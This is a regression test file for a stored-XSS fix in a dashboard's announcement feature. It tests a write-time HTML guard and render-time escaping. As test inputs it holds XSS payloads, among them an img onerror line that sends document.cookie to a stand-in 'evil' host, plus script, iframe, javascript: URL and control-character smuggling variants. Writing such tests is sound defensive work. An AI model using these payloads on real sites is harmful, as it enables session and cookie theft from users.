/**
 * Security issue #1 - stored XSS via announcement content.
 *
 * Two regression layers:
 *
 * 1. WRITE-TIME GUARD - `assertPlainTextContent` rejects HTML markup in
 *    authored content before it can ever be stored (both `insertContent`
 *    and `patchContent` call it).
 *
 * 2. RENDER-TIME ESCAPING - even if a legacy row somehow contains markup,
 *    `AnnouncementContentCard` renders content as escaped plain text: the
 *    dangerous `dangerouslySetInnerHTML` sink was removed.
 */
import { describe, expect, test } from "bun:test";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";

import { AnnouncementContentCard } from "../../src/app/dashboard/content/announcements/[id]/_components/announcement-content-card";
import { assertPlainTextContent } from "../../src/lib/services/content/content-safety";
import { ContentApiError } from "../../src/lib/services/content/errors";
import type { Announcement } from "../../src/types/announcement";

/* ------------------------------------------------------------------ */
/* Layer 1: write-time guard                                           */
/* ------------------------------------------------------------------ */

describe("assertPlainTextContent (write-time guard)", () => {
  test("accepts plain-text content", () => {
    expect(() => assertPlainTextContent("Scheduled maintenance on Saturday.")).not.toThrow();
    expect(() => assertPlainTextContent("")).not.toThrow();
    expect(() => assertPlainTextContent("Line one\nLine two - plain text.")).not.toThrow();
  });

  test("rejects the exact payload from issue #1", () => {
    expect(() =>
      assertPlainTextContent("<img src=x onerror=fetch('https://evil/?c='+document.cookie)>"),
    ).toThrow(ContentApiError);
  });

  test("rejects script tags in every casing", () => {
    expect(() => assertPlainTextContent("<script>alert(1)</script>")).toThrow(ContentApiError);
    expect(() => assertPlainTextContent("<SCRIPT>alert(1)</SCRIPT>")).toThrow(ContentApiError);
    let threw = false;
    try {
      assertPlainTextContent("<ScRiPt src=//evil>");
    } catch {
      threw = true;
    }
    expect(threw).toBe(true);
  });

  test("rejects dangerous tags even without attributes", () => {
    for (const payload of [
      "<svg onload=alert(1)>",
      "<iframe srcdoc='<script>alert(1)</script>'>",
      "<object data='//evil'>",
      "<embed src='//evil'>",
      "<form action='//evil'>",
      "<base href='//evil'>",
      "<math href='javascript:alert(1)'>",
    ]) {
      let threw = false;
      try {
        assertPlainTextContent(payload);
      } catch (error) {
        threw = true;
        expect(error).toBeInstanceOf(ContentApiError);
        expect((error as ContentApiError).status).toBe(400);
      }
      expect(threw).toBe(true);
    }
  });

  test("rejects benign-looking tags too (plain-text authoring model)", () => {
    let threw = false;
    try {
      assertPlainTextContent("<p>Hello <b>world</b></p>");
    } catch (error) {
      threw = true;
      expect(error).toBeInstanceOf(ContentApiError);
      expect((error as ContentApiError).status).toBe(400);
    }
    expect(threw).toBe(true);
  });

  test("rejects control-character smuggling of dangerous keywords (adversarial round 1)", () => {
    // Raw control bytes are used to split keywords across regex boundaries;
    // the guard rejects them outright (whitespace \t \n \r stays allowed).
    expect(() => assertPlainTextContent("javasc\u0000ript:alert(1)")).toThrow(ContentApiError);
    expect(() => assertPlainTextContent("<scr\u0001ipt>alert(1)</script>")).toThrow(
      ContentApiError,
    );
    expect(() => assertPlainTextContent("a\tb\nc\rd")).not.toThrow();
  });

  test("rejects namespaced, custom, and bare-EOF tags (adversarial round 1)", () => {
    expect(() => assertPlainTextContent("<x:script>alert(1)</x:script>")).toThrow(ContentApiError);
    expect(() => assertPlainTextContent("<my-comp onclick=alert(1)>")).toThrow(ContentApiError);
    expect(() => assertPlainTextContent("hello <div")).toThrow(ContentApiError);
    expect(() => assertPlainTextContent("<x-foo onclick/=alert(1)>click</x-foo>")).toThrow(
      ContentApiError,
    );
  });

  test("rejects inline event handlers and javascript: URLs in text", () => {
    let handlersThrew = false;
    try {
      assertPlainTextContent("click here onerror=alert(1)");
    } catch {
      handlersThrew = true;
    }
    expect(handlersThrew).toBe(true);

    let jsUrlThrew = false;
    try {
      assertPlainTextContent("visit javascript:alert(document.cookie) now");
    } catch {
      jsUrlThrew = true;
    }
    expect(jsUrlThrew).toBe(true);
  });

  test("does not false-positive on prose with comparison operators", () => {
    expect(() => assertPlainTextContent("5 < 6 and 7 > 3 are true")).not.toThrow();
    expect(() => assertPlainTextContent("Use a -> b arrow, not HTML")).not.toThrow();
    expect(() => assertPlainTextContent("a < b and c > d")).not.toThrow();
  });
});

/* ------------------------------------------------------------------ */
/* Layer 2: render-time escaping                                       */
/* ------------------------------------------------------------------ */

function makeAnnouncement(content: string): Announcement {
  return {
    id: "ann-1",
    title: "Test announcement",
    slug: "test-announcement",
    excerpt: "Excerpt",
    content,
    status: "published",
    author: { id: "u-1", name: "Author", email: "a@example.com", role: "member" },
    tags: [],
    lastModified: new Date("2026-08-15T00:00:00Z"),
    readTime: 1,
    wordCount: 10,
    seo: { title: "Test", description: "", keywords: [] },
    metrics: {
      views: 0,
      reads: 0,
      shares: 0,
      comments: 0,
      likes: 0,
      bookmarks: 0,
      averageReadTime: 0,
      completionRate: 0,
      engagementScore: 0,
      bounceRate: 0,
    },
    visibility: "public",
    version: 1,
    language: "en",
    commentsEnabled: false,
    sharingEnabled: false,
    downloadEnabled: false,
    isFeatured: false,
    type: "general",
    category: "announcements",
    priority: "medium",
    targetAudience: "all_members",
    isPinned: false,
    isUrgent: false,
    requiresAcknowledgment: false,
    sendEmailNotification: false,
    sendPushNotification: false,
    displayOnHomepage: false,
    displayInDashboard: false,
  };
}

function renderCard(content: string): string {
  return renderToStaticMarkup(
    createElement(AnnouncementContentCard, { announcement: makeAnnouncement(content) }),
  );
}

describe("AnnouncementContentCard render-time escaping", () => {
  test("the issue #1 payload is escaped, never interpolated as HTML", () => {
    const payload = "<img src=x onerror=fetch('https://evil/?c='+document.cookie)>";
    const html = renderCard(payload);
    // No live element: the tag must only appear in entity-escaped form, and
    // the quotes must be escaped too (proves a full escape pass, not a partial one).
    expect(html).not.toContain("<img");
    expect(html).toContain(
      "&lt;img src=x onerror=fetch(&#x27;https://evil/?c=&#x27;+document.cookie)&gt;",
    );
  });

  test("script payloads are escaped", () => {
    const html = renderCard("<script>alert(document.cookie)</script>");
    expect(html).not.toContain("<script");
    expect(html).toContain("&lt;script&gt;");
  });

  test("plain text with newlines is preserved", () => {
    const html = renderCard("Line one\nLine two");
    expect(html).toContain("Line one");
    expect(html).toContain("Line two");
  });
});
